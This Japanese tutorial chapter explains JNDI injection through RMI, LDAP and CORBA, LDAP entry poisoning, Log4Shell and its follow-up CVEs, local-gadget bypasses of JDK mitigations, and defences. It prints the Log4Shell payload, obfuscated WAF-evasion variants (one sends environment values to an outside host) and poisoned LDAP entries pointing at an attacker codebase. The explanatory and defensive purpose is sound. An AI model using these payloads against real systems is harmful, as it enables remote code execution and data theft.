## JNDI/RMI/LDAP経由のRCEとLog4Shell

Javaのデシリアライゼーション攻撃を学ぶと必ず突き当たるのが**JNDIインジェクション**である。これは「悪意あるバイト列を`readObject()`に流し込む」古典的なガジェットチェーンとは少し毛色が違う。攻撃者が直接送り込むのは**ただのURL文字列**であり、そのURLをアプリケーションが`lookup()`しただけで、遠隔サーバから取得されたJavaオブジェクトが再構築され、最終的に任意コード実行（RCE）へ至る。2021年末に世界を揺るがした**Log4Shell（CVE-2021-44228）**は、まさにこのJNDIインジェクションを「ログ文字列」という誰もが信頼しきっていた経路から発火させた事件だった。

本節では、まずJNDIという仕組みそのものを分解し、なぜ「URLを1本渡すだけ」でコードが動くのかを**Naming Manager（命名マネージャ）の内部実装レベル**で解き明かす。そのうえでLog4Shellがどうやってこの古い問題を再点火したのか、そしてJDK側の緩和策（`trustURLCodebase`）が効いてもなおRCEが成立する「ローカルガジェット」の世界までを扱う。攻撃コードそのものを組み立てる手順は示さず、**なぜそうなるのか＝防御のためにどこを塞ぐべきか**に焦点を当てる。

---

### JNDIとは何か —— 名前からオブジェクトを引く共通API

**JNDI（Java Naming and Directory Interface）**は、さまざまな「命名サービス（Naming Service）」や「ディレクトリサービス（Directory Service）」に対して、統一されたAPIでアクセスするための抽象化レイヤである。

- **命名サービス**とは、名前と値を結びつける（この結びつきを**バインディング（binding）**と呼ぶ）実体で、名前を手がかりにオブジェクトを探す`lookup`（検索）操作を提供する。
- **ディレクトリサービス**は命名サービスの特殊形で、格納するオブジェクトに**属性（attribute）**を付けられる。名前だけでなく属性による`search`（検索）ができる。

JNDIの構造は4層になっている。上から順に「Javaアプリケーション」→「JNDI API」→「Naming Manager（命名マネージャ。コンテキストやオブジェクトを生成する静的メソッド群を持つ）」→「JNDI SPI（Service Provider Interface）」であり、SPIの下に **LDAP・DNS・NIS・NDS・RMI・CORBA** といった具体的なバックエンドがぶら下がる。つまりJNDIは「どのプロトコルでオブジェクトを取ってくるか」を差し替え可能にした、いわばプラグイン機構である。

```java
// RMIレジストリと会話するInitialContextを作る例（Black Hat 2016スライドより）
Hashtable env = new Hashtable();
env.put(INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
env.put(PROVIDER_URL, "rmi://localhost:1099");
Context ctx = new InitialContext(env);

// 名前 "foo" に文字列をバインドし、あとで引く
ctx.bind("foo", "Sample String");
Object local_obj = ctx.lookup("foo");
```

`PROVIDER_URL`を`ldap://localhost:389`（`INITIAL_CONTEXT_FACTORY`は`com.sun.jndi.ldap.LdapCtxFactory`）に変えれば、同じAPIでLDAPを相手にできる。この**「バックエンドをURLで切り替えられる」**設計こそが、後述する攻撃の入口になる。

> 出典: Munoz & Mirosh, "A Journey From JNDI/LDAP Manipulation to RCE" (Black Hat USA 2016) — https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf

---

### Naming References —— 「オブジェクトの作り方」をディレクトリに置く

Javaオブジェクトをディレクトリに格納する素直な方法は、`java.io.Serializable`でシリアライズしてバイト列として保存することだ。しかしオブジェクトグラフが巨大すぎたり、シリアライズが不適切だったりする場合がある。そこでJNDIは**Naming Reference（命名参照）**という仕組みを用意した。これは「オブジェクトそのもの」ではなく「オブジェクトを作るための指示書」を格納するものである。Referenceは主に次の情報を持つ。

- **Reference Address**: オブジェクトのアドレス（例: `rmi://server/ref`）
- **Remote Factory（リモートファクトリ）**: オブジェクトを生成する**ファクトリクラスの名前**と、その**クラスファイルの置き場所（Codebase）**

ここが攻撃の核心だ。lookupの結果としてReferenceが返ってきたとき、クライアント側のNaming Managerは「ファクトリクラスをロードして`newInstance()`する」ことでオブジェクトを組み立てる。そのファクトリクラスが**手元のクラスパスに無ければ、Referenceに書かれたCodebase（＝任意のURL）からダウンロードして読み込む**のである。攻撃者がReferenceを制御できれば、Codebaseを自分のHTTPサーバに向けられる。

Naming Managerの復号（デコード）ロジックの実物が以下だ。

```java
// NamingManager.getObjectFactoryFromReference の抜粋（JDK内部コード）
static ObjectFactory getObjectFactoryFromReference(Reference ref, String factoryName) {
    Class clas = null;
    // まず現在のクラスローダで探す ...
    // クラスパスに無ければ codebase を使ってロードを試みる
    String codebase;
    if (clas == null && (codebase = ref.getFactoryClassLocation()) != null) {
        try {
            clas = helper.loadClass(factoryName, codebase);   // ← 遠隔からクラスをロード
        } catch (ClassNotFoundException e) {}
    }
    return (clas != null) ? (ObjectFactory) clas.newInstance() : null;  // ← インスタンス化＝コード実行
}
```

`ref.getFactoryClassLocation()`が攻撃者の`http://attacker-server/`を返し、`helper.loadClass()`がそこからバイトコードをフェッチする。読み込まれたクラスの`newInstance()`が呼ばれた瞬間、そのクラスの静的初期化子やコンストラクタに仕込まれたコードが**被害者JVM上で**動く。これが「URLを渡すだけでRCE」の正体である。

> 出典: Munoz & Mirosh, "A Journey From JNDI/LDAP Manipulation to RCE" (Black Hat USA 2016) — https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf

---

### 攻撃の全体像と「動的プロトコル切り替え」

Munoz & Miroshが整理したJNDIインジェクションの流れは5ステップである。

1. 攻撃者が自分の命名/ディレクトリサービスにペイロード（悪意あるReference等）をバインドしておく。
2. 攻撃者が脆弱なlookupメソッドに**絶対URL**を注入する。
3. アプリがそのlookupを実行する。
4. アプリが攻撃者制御のサービスへ接続し、ペイロードを受け取る。
5. アプリがレスポンスをデコードし、ペイロードが発火する。

決定的に重要なのは、`javax.naming.InitialContext`（およびその子クラス`InitialDirContext`／`InitialLdapContext`）の`lookup()`が、**引数に絶対URLが与えられると、その場でプロトコルとプロバイダを動的に切り替える**という挙動だ。

```java
// アプリはローカルのRMIレジストリを想定していても……
env.put(PROVIDER_URL, "rmi://secure-server:1099");
Context ctx = new InitialContext(env);

// lookupの引数が攻撃者制御なら、ここで別プロトコル・別サーバに飛ばされる
Object local_obj = ctx.lookup( <attacker-controlled> );
```

`lookup()`の引数として`rmi://attacker-server/bar`、`ldap://attacker-server/cn=bar,dc=test,dc=org`、`iiop://attacker-server/bar`のいずれかを渡せば、設定された`PROVIDER_URL`を無視して攻撃者のサーバへ接続してしまう。したがって**「lookupの名前部分にユーザ入力が混じる」ことが根本的な脆弱性**である。スライドの言葉を借りれば "Applications should not perform JNDI lookups with untrusted data"（アプリは信頼できないデータでJNDIルックアップを行ってはならない）。

Munoz & Miroshは、RCEに至る主要ベクタを **RMI・CORBA・LDAP** の3系統に整理した。それぞれ「JNDI Reference」「シリアライズ済みオブジェクト」「IOR」などのサブベクタを持つ。なお`lookup`の引数が直接ユーザ入力でなくとも、**デシリアライゼーション攻撃の途中でlookupを呼ぶガジェット**を経由して到達することもある。スライドが挙げる実例が次だ。

- `org.springframework.transaction.jta.JtaTransactionManager`（@zerothinking）
- `com.sun.rowset.JdbcRowSetImpl.execute()`（@matthias_kaiser）
- `javax.management.remote.rmi.RMIConnector.connect()`
- `org.hibernate.jmx.StatisticsService.setSessionFactoryJNDIName(String)`

これらは「デシリアライズ時にフィールド値を使ってJNDI lookupを行う」性質を持つため、**デシリアライゼーション → JNDIインジェクション → 遠隔クラスロード → RCE**という連鎖の中継点になる。第3章で扱ったガジェットチェーンとJNDIが地続きであることがよく分かる。

> 出典: Munoz & Mirosh, "A Journey From JNDI/LDAP Manipulation to RCE" (Black Hat USA 2016) — https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf

---

### RMI・LDAP・CORBAで遠隔クラスロードが許される条件

「遠隔からクラスをロードする」動作は、実はコンポーネントごとに可否と条件が違う。Black Hat 2016スライドの表を再構成すると次のようになる。

| コンポーネント | 遠隔クラスロードを有効にするJVMプロパティ | SecurityManagerの強制 |
|---|---|---|
| RMI (SPI) | `java.rmi.server.useCodebaseOnly = false` （**JDK 7u21以降のデフォルトは `true`**） | 常に強制 |
| LDAP (SPI) | `com.sun.jndi.ldap.object.trustURLCodebase = true` （**デフォルトは `false`**） | 強制されない |
| CORBA (SPI) | — | 常に強制 |
| Naming Manager | — | 強制されない |

この表の読み方が防御上きわめて重要である。

- **RMIとCORBA**は、遠隔クラスロード時に必ず**SecurityManager**によるチェックが入る。つまりポリシー設定がまともなら、ダウンロードしたクラスは危険な権限を持てず、実害を抑えられる。ただしSecurityManagerが（デフォルトのように）無効なアプリでは、このガードは効かない。逆に、**SecurityManagerを有効にしても不適切なPolicyファイルだと、CORBA/IIOPリスナー経由で「untrusted」コードに`java.security.AllPermission`が与えられ、かえってRCEの裏口を開く**ことがある、とスライドは警告している。
- **LDAP**は歴史的に、遠隔クラスロードに際して**SecurityManagerの強制が入らない**。そのため`trustURLCodebase`がtrueなら無条件にRCEへ直行しやすく、JNDIインジェクションで最も好まれるベクタだった。

> 出典: Munoz & Mirosh, "A Journey From JNDI/LDAP Manipulation to RCE" (Black Hat USA 2016) — https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf

---

### LDAPエントリポイズニング —— lookupしていなくても危ない

RMIベクタは「攻撃者が自前のRMIレジストリを立て、Reference返却でクラスロードさせる」構図だった。LDAPには、それに加えてもっと厄介な**Entry Poisoning（エントリポイズニング）**がある。攻撃者がlookupの引数を制御できなくても、**LDAPエントリの内容を書き換えられる／LDAPレスポンスを改ざんできる**だけでRCEが成立しうるのだ。

仕組みは**RFC 2713「Java Schema」**にある。このRFCは、JavaオブジェクトをLDAPディレクトリに格納するための属性を定義している。

- **シリアライズ済みオブジェクト（javaSerializedObject）**: `javaClassName`, `javaCodebase`, `javaSerializedData`
- **JNDI参照（javaNamingReference）**: `javaClassName`, `javaCodebase`, `javaReferenceAddress`, `javaFactory`
- **Marshalled Object（javaMarshalledObject）**、**Remote Location（廃止扱い）**なども存在

LDAPの`search`はデフォルトで属性を返すだけの無害な操作に見える。しかし`SearchControls.setReturningObjFlag(true)`が呼ばれていると事情が一変する。JavaDocはこう述べる——「検索がエントリのオブジェクト返却を要求していた場合、`SearchResult`はエントリを表すオブジェクトを含む。もし過去に`java.io.Serializable`, `Referenceable`, `Reference`オブジェクトがそのLDAP名にバインドされていたなら、**エントリの属性を使ってそのオブジェクトを再構築する**」。JDK内部の`com.sun.jndi.ldap.LdapSearchEnumeration`／`LdapBindingEnumeration`のコードで言えば次の分岐である。

```java
// 返却オブジェクトが要求されているときだけオブジェクトを生成
if (searchArgs.cons.getReturningObjFlag()) {
    if (attrs.get(Obj.JAVA_ATTRIBUTES[Obj.CLASSNAME]) != null) {
        // エントリが Java-object 属性（ser/ref object）を含む場合
        obj = Obj.decodeObject(attrs);   // ← ここで属性からオブジェクトを復元
    }
    if (obj == null) {
        obj = new LdapCtx(homeCtx, dn);
    }
}
```

つまり、`javaClassName`属性が存在するだけで`Obj.decodeObject(attrs)`が呼ばれ、シリアライズ済みデータのデシリアライズや、Referenceのファクトリクラスロードが走る。**汚染されたエントリの例**（防御理解のための構造）は次の通り。

シリアライズ済みオブジェクトによるポイズニング:
```
ObjectClass: inetOrgPerson
UID: john
javaSerializedData: ACED01A43C4432FEEA1489AB89EF11183E499...   ← シリアライズ済みガジェット
javaCodebase: http://attacker-server/
javaClassName: DeserializationPayload
```
`javaSerializedData`はデシリアライズされるので、**クラスパス上にガジェットチェーン（例: CommonsCollections）があれば`trustURLCodebase`がfalseでもRCEになりうる**。スライドは明言する——`com.sun.jndi.ldap.object.trustURLCodebase`がtrueなら攻撃者は自前クラスを持ち込め、falseでも**クラスパス上の既存ガジェットを使える**。

JNDI参照によるポイズニング:
```
ObjectClass: inetOrgPerson, javaNamingReference
javaCodebase: http://attacker-server/     ← ファクトリクラスの置き場所
JavaFactory: Factory                      ← ファクトリクラス名
javaClassName: MyClass
```
こちらは前述のReferenceデコード経路で遠隔クラスロードに至る（ただしLDAP遠隔ロードは`trustURLCodebase`に依存）。

この攻撃が現実的になるシナリオとして、スライドは**Rogue employees（LDAP書き込み権を持つ内部者）／脆弱なLDAPサーバ／書き込み権を持つアプリの資格情報／LDAP用のWeb API（REST・SOAP・DSML）／緩いLDAP ACL／SSO・IdP連携**を挙げる。攻撃の発火方法も、エントリを直接汚染する**Entry Manipulation**と、通信を横取りしてレスポンスを差し替える**MiTM Tampering**の2通りがある。デモ対象は`FilterBasedLdapUserSearch.searchForUser(String username)`を使う**spring-security-ldap**で、バージョン**3.2.0以降**は`buildControls()`が内部で`returningObjFlag`をtrueにするため、認証のためにユーザ属性を引くだけでオブジェクト復元経路に入ってしまう、というものだった。

> 出典: Munoz & Mirosh, "A Journey From JNDI/LDAP Manipulation to RCE" (Black Hat USA 2016) — https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf

---

### Log4Shell —— ログ文字列がJNDIインジェクションになる

> ⚠️ **未取得の資料**: 「HackTricks: JNDI & Log4Shell」は自動取得できませんでした（理由: リダイレクト先が HTTP 402 Payment Required を返し、ミラーも取得不可）。以下のURLからご自身で直接ご覧ください: https://hacktricks.wiki/en/pentesting-web/deserialization/jndi-java-naming-and-directory-interface-and-log4shell.html
>
> （以下は未取得資料の補足として、Moritz Bechlerの記事と公開されているApache Log4jセキュリティ勧告に基づく一般知識の解説です。）

2016年のJNDIインジェクション研究は「lookupにユーザ入力を渡すアプリ」を前提にしていた。**Log4Shell（CVE-2021-44228）**が衝撃的だったのは、その「ユーザ入力からlookupへの経路」が、世界中のあらゆるJavaアプリに埋め込まれた**ロギングライブラリ Apache Log4j 2**の中に潜んでいたからだ。Moritz Bechlerの言葉を借りれば、問題の本質は単純である——「**Log4Jはログメッセージ中のプレースホルダを展開する際にJNDIの`lookup()`を実行する**」。

Log4j 2には**Lookup**という文字列展開機能があり、ログ出力に`${...}`という記法で動的な値を埋め込める。`${java:version}`や`${env:USER}`のように。問題は、この展開が**ログとして記録される文字列の本体に対しても行われる**点と、Lookupの一種に`jndi`が含まれていた点だ。したがって攻撃者は、アプリがログに書きそうな任意の場所（`User-Agent`ヘッダ、ユーザ名、検索クエリなど）に次のような文字列を仕込むだけでよい。

```
${jndi:ldap://attacker-server/a}
```

これがログ処理の中で展開されると、Log4jは`ldap://attacker-server/a`をJNDIで`lookup`する。以降は本節で説明してきた通り——攻撃者のLDAPサーバがReferenceを返し、Naming Managerがファクトリクラスを遠隔ロードし、`newInstance()`でコードが動く。認証も特別な権限も要らず、CVSSは満点の**10.0**。影響範囲は**Log4j 2.0-beta9 〜 2.14.1**という広大なものだった。

Log4jのLookupはネストや文字変換をサポートするため、単純な文字列マッチによる検知・遮断は容易に回避される。代表的な難読化バリアントを示す（防御側が「これらも同一の攻撃だ」と理解するために挙げる）。

```
${jndi:ldap://host/a}                                     基本形
${jndi:${lower:l}${lower:d}ap://host/a}                   lower Lookup で l/d/a/p を小文字化して組み立て
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://host/a}   :- のデフォルト値展開で1文字ずつ合成
${jndi:${env:FOO:-l}dap://host/a}                         env Lookup（未定義なら :- のデフォルト値）で文字を挿入
${jndi:dns://host/a}                                      dns スキームで到達確認（OOB検知）
${jndi:ldap://${env:USER}.host/a}                         env で盗んだ値をサブドメインに載せて外部送信
```

なぜ回避できるのか。`${lower:...}`や`${::-x}`（`:-`はデフォルト値演算子）といった変換Lookupは、**JNDI Lookupに渡す前段で文字列を組み立て直す**ため、`jndi`や`ldap`という語がリテラルとして現れない。WAFやログフィルタが固定文字列を弾いても、実行時に等価な文字列へ復元されてしまうのだ。

Log4Shellの修正は一度では終わらず、連鎖的に複数のCVEが発行された（対象バージョンと修正版は防御判断に直結するため明記する）。

| CVE | 概要 | 修正版 |
|---|---|---|
| CVE-2021-44228 | 本体。JNDI LookupによるRCE。対象 2.0-beta9〜2.14.1 | 2.15.0 |
| CVE-2021-45046 | 2.15.0の修正が不完全。非デフォルト構成（Thread Context Map値をPatternLayoutで出力等）でRCE/情報漏えい・DoS | 2.16.0（`message` LookupやJNDIを既定で無効化） |
| CVE-2021-45105 | 自己参照Lookupによる無限再帰でDoS（StackOverflow） | 2.17.0 |
| CVE-2021-44832 | JDBC Appender設定を攻撃者が操作できる場合のRCE（前提条件が重い） | 2.17.1 |

Bechlerが強調する結論はきわめて実務的だ——「**現行のJavaバージョンが救ってくれると当てにするな。Log4jを更新せよ（あるいはJNDI Lookupを取り除け）。展開機能を無効化せよ**」。なぜJDKのバージョンに頼るのが危険なのか。次項でそのからくりを説明する。

> 出典: Moritz Bechler, "PSA: Log4Shell and the current state of JNDI injection" — https://mbechler.github.io/2021/12/10/PSA_Log4Shell_JNDI_Injection/

---

### 「新しいJDKなら安全」が成り立たない理由 —— ローカルガジェット

Log4Shellが騒ぎになった当初、「JDKを新しくすればReferenceの遠隔クラスロードは無効化されているから安全」という言説が広まった。Bechlerの記事は、この楽観を明確に否定する。JDK側の緩和策の歴史を押さえておこう。

- **RMIの遠隔Codebase無効化**: JDK **8u121**（2016年）で`com.sun.jndi.rmi.object.trustURLCodebase`のデフォルトが`false`になり、RMI Reference経由の遠隔クラスロードが既定で塞がれた。
- **LDAPの遠隔Codebase無効化**: JDK **8u191**（2018年、CVE-2018-3149）で`com.sun.jndi.ldap.object.trustURLCodebase`のデフォルトが`false`になり、LDAP Reference経由の遠隔クラスロードも既定で塞がれた。

これらが効くと、攻撃者の「自前クラスファイルをHTTPで配ってロードさせる」王道は使えなくなる。しかしBechlerが指摘する通り、**8u191以降でもJNDIインジェクションは死んでいない**。残る経路は2つある。

1. **ローカルガジェットクラス**: 遠隔からクラスを持ち込めなくても、**被害者のクラスパスにすでに存在するクラス**をReferenceのファクトリとして指名できる。有名なのが**Apache XBeanの`org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding`**経由や、`org.apache.naming.factory.BeanFactory`のようなファクトリで、これらは属性で指定されたクラスをBeanとして生成し、セッタを呼ぶ過程で任意の`ELProcessor`評価やコマンド実行に持ち込めるものがある（WebSphere等のアプリサーバ固有ガジェットも報告されている）。ポイントは、**これらは「遠隔クラスロード」ではなく「ローカルに存在するクラスの悪用」なので`trustURLCodebase`のガードを一切通らない**ことだ。

2. **Javaデシリアライゼーション**: RMIもLDAPも、応答オブジェクトを**デシリアライズ**する経路を持つ。デシリアライズ自体は`trustURLCodebase`とは無関係に実行されるため、**グローバルなデシリアライズフィルタ（`jdk.serialFilter`／JEP 290）が設定されていなければ**、クラスパス上のガジェットチェーンでRCEに至る。前述のLDAP `javaSerializedData`ポイズニングは、まさにこの経路である。

だからBechlerは「Javaのバージョンに頼るな」と言う。JDKの緩和は**遠隔クラスロードという一経路を塞いだだけ**であって、ローカルガジェットとデシリアライズという二経路は残る。両者はクラスパス上に何のライブラリがあるか（＝アプリの依存関係）に左右されるため、**「うちのJDKは新しいから大丈夫」は誤り**なのだ。根本対策はJNDI Lookupという機能そのものを、信頼できない入力から到達不能にすることに尽きる。

> 出典: Moritz Bechler, "PSA: Log4Shell and the current state of JNDI injection" — https://mbechler.github.io/2021/12/10/PSA_Log4Shell_JNDI_Injection/

---

### 防御のまとめ

本節で見てきた原理から、防御の勘所を整理する。いずれも「攻撃を試す」ためではなく、自組織の資産を守るための設計・運用指針である。

- **信頼できない入力でJNDI lookupをしない**。これが唯一にして最大の原則。lookupの名前部分にユーザ入力が混じらないよう、コードとフレームワーク設定を監査する。
- **Log4jを最新の修正版（少なくとも2.17.1以降）へ更新する**。応急処置として`log4j2.formatMsgNoLookups=true`やJndiLookupクラスの除去があるが、CVE-2021-45046が示すように応急策には抜けがあるため、恒久対策はバージョン更新。
- **`trustURLCodebase`は必ずfalseのまま**にする（`com.sun.jndi.rmi.object.trustURLCodebase`／`com.sun.jndi.ldap.object.trustURLCodebase`）。ただしこれは遠隔クラスロードを塞ぐだけで、ローカルガジェット・デシリアライズ経路には無力である点を忘れない。
- **JEP 290のデシリアライズフィルタ（`jdk.serialFilter`）を設定**し、想定外のクラスのデシリアライズを拒否する。LDAP `javaSerializedData`ポイズニングやRMI/CORBAデシリアライズ経路への横断的な防御になる。
- **不要なプロトコルとリスナーを無効化**する。使わないRMI/IIOP/CORBAリスナーを露出させない。SecurityManagerを有効にする場合は**Policyファイルの権限を最小化**する（緩いPolicyはCORBA経路でかえって危険）。
- **クラスパスの依存を減らす**。ローカルガジェットは既存ライブラリを踏み台にするため、不要な依存（古いCommons Collections等）を排除するだけで攻撃面が縮む。
- **LDAP側の防御**として、エントリへの書き込みACLを最小化し（Java Schema属性の書き込みを制限）、LDAP通信をTLSで保護してMiTMによるレスポンス改ざんを防ぐ。

Log4Shellが世界規模の惨事になったのは、脆弱性そのものが新しかったからではなく、2016年に警告された古典的なJNDIインジェクションが、**誰もが使うロギングという「見えない配管」を通じて無数のアプリに再配布されていた**からだ。デシリアライゼーションとSSTIがRCEに合流する本書のテーマにおいて、JNDIは「文字列がオブジェクトに、オブジェクトがコードになる」最短経路として、今後も繰り返し姿を変えて現れるだろう。
